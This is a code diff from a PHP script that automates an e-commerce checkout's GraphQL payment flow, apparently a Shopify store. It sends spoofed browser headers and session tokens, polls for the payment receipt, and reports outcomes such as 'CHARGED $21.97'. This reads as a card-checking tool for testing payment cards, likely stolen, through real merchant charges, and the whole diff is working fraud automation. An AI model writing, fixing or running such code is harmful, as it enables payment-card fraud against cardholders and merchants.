@@ -799,100 +799,98 @@ if (json_last_error() !== JSON_ERROR_NONE) {
 
 flush();
 
-// Continue with existing code...
+// FIXED RECEIPT ID EXTRACTION
 if (isset($response4js->data->submitForCompletion->receipt->id)) {
     $recipt_id = $response4js->data->submitForCompletion->receipt->id;
-} elseif (isset($response4js->data->submitForCompletion->__typename)) {
-    // Error already set above
+    echo "<pre>🎫 RECEIPT ID FOUND: $recipt_id</pre>";
+} elseif (isset($response4js->data->submitForCompletion->__typename) && $response4js->data->submitForCompletion->__typename === 'SubmitSuccess') {
+    // Success but no receipt ID yet (processing)
+    $err = "🔄 Payment Processing - Check PollForReceipt";
+    echo "<pre>🔄 Payment submitted successfully, waiting for processing...</pre>";
+} elseif (isset($response4js->data->submitForCompletion->reason)) {
+    $err = "❌ Payment Failed: " . $response4js->data->submitForCompletion->reason;
 } elseif (isset($response4js->errors)) {
-    $err = "GraphQL Errors";
+    $err = "GraphQL Error: ";
     foreach ($response4js->errors as $error) {
-        $err .= " - " . ($error->message ?? 'Unknown error');
+        $err .= ($error->message ?? 'Unknown error') . " ";
     }
 }
 
-if (empty($recipt_id) && empty($err)) {
-    $err = 'Receipt id is empty - Check step 3 response for details';
-    $debug_info['step3_parsed'] = $response4js;
+// If we have receipt ID, proceed to poll
+if (!empty($recipt_id)) {
+    echo "<pre>✅ Step 3 Complete - Receipt ID: $recipt_id</pre>";
+    flush();
+    
+    sleep(2);
+    
+    // Fourth request - Poll for receipt status
+    $postf2 = json_encode([
+        'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}',
+        'variables' => [
+            'receiptId' => $recipt_id,
+            'sessionToken' => $x_checkout_one_session_token
+        ],
+        'operationName' => 'PollForReceipt'
+    ]);
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'accept: application/json',
+        'accept-language: en-US',
+        'content-type: application/json',
+        'origin: '.$urlbase,
+        'priority: u=1, i',
+        'referer: '.$urlbase,
+        'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+        'sec-ch-ua-mobile: ?0',
+        'sec-ch-ua-platform: "Windows"',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-origin',
+        'user-agent: '.$ua,
+        'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
+        'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
+        'x-checkout-web-deploy-stage: production',
+        'x-checkout-web-server-handling: fast',
+        'x-checkout-web-server-rendering: no',
+        'x-checkout-web-source-id: ' . $checkoutToken,
+    ]);
+
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
+
+    $start = microtime(true);
+    $response5 = curl_exec($ch);
+    $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $end = microtime(true);
+    $time_taken = number_format($end - $start, 2);
+    curl_close($ch);
+
+    echo "<pre>🔍 PollForReceipt Response - HTTP: $http_code5</pre>";
+    echo "<pre>Response: $response5</pre>";
+    
+    $r5js = json_decode($response5);
+    
+    // Process the poll response
+    if (isset($r5js->data->receipt->processingError->code)) {
+        $err = $r5js->data->receipt->processingError->code;
+        if (isset($r5js->data->receipt->processingError->messageUntranslated)) {
+            $err .= " - " . $r5js->data->receipt->processingError->messageUntranslated;
+        }
+    } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessedReceipt') {
+        $err = '🔥 CHARGED $21.97 ✅';
+    } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessingReceipt') {
+        $err = '🔄 Payment Still Processing';
+    } else {
+        $err = 'Unknown poll response';
+    }
+    
+} else {
+    // No receipt ID case
+    echo "<pre>❌ No receipt ID received from SubmitForCompletion</pre>";
 }
-
-        // Enhanced receipt ID extraction with better error handling
-        if (isset($response4js->data->submitForCompletion->receipt->id)) {
-            $recipt_id = $response4js->data->submitForCompletion->receipt->id;
-        } elseif (isset($response4js->data->submitForCompletion->__typename)) {
-            $err = "Submit failed: " . $response4js->data->submitForCompletion->__typename;
-            if (isset($response4js->data->submitForCompletion->reason)) {
-                $err .= " - " . $response4js->data->submitForCompletion->reason;
-            }
-            throw new Exception($err);
-        } elseif (isset($response4js->errors[0]->message)) {
-            $err = "GraphQL Error: " . $response4js->errors[0]->message;
-            throw new Exception($err);
-        }
-
-        if (empty($recipt_id)) {
-            $err = 'Receipt id is empty - Check step 3 response for details';
-            $debug_info['step3_parsed'] = $response4js;
-            throw new Exception($err);
-        }
-
-        echo "<pre>✅ Step 3 Complete - Receipt ID: $recipt_id</pre>";
-        flush();
-
-        sleep(2);
-
-        // Fourth request - Poll for receipt
-        $postf2 = json_encode([
-            'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}',
-            'variables' => [
-                'receiptId' => $recipt_id,
-                'sessionToken' => $x_checkout_one_session_token
-            ],
-            'operationName' => 'PollForReceipt'
-        ]);
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-        curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'accept: application/json',
-            'accept-language: en-US',
-            'content-type: application/json',
-            'origin: '.$urlbase,
-            'priority: u=1, i',
-            'referer: '.$urlbase,
-            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-            'sec-ch-ua-mobile: ?0',
-            'sec-ch-ua-platform: "Windows"',
-            'sec-fetch-dest: empty',
-            'sec-fetch-mode: cors',
-            'sec-fetch-site: same-origin',
-            'user-agent: '.$ua,
-            'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
-            'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
-            'x-checkout-web-deploy-stage: production',
-            'x-checkout-web-server-handling: fast',
-            'x-checkout-web-server-rendering: no',
-            'x-checkout-web-source-id: ' . $checkoutToken,
-        ]);
-
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
-
-        $start = microtime(true); // ▶️ Start timing
-
-        $response5 = curl_exec($ch);
-        $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-
-        $end = microtime(true); // ▶️ End timing
-        $time_taken = number_format($end - $start, 2);
-
-        $debug_info['step4_http_code'] = $http_code5;
-        $debug_info['step4_response'] = $response5;
-
-        curl_close($ch);
-
-        $r5js = json_decode($response5);
 
         echo "<pre>✅ Step 4 Complete - Final Response Received</pre>";
         flush();
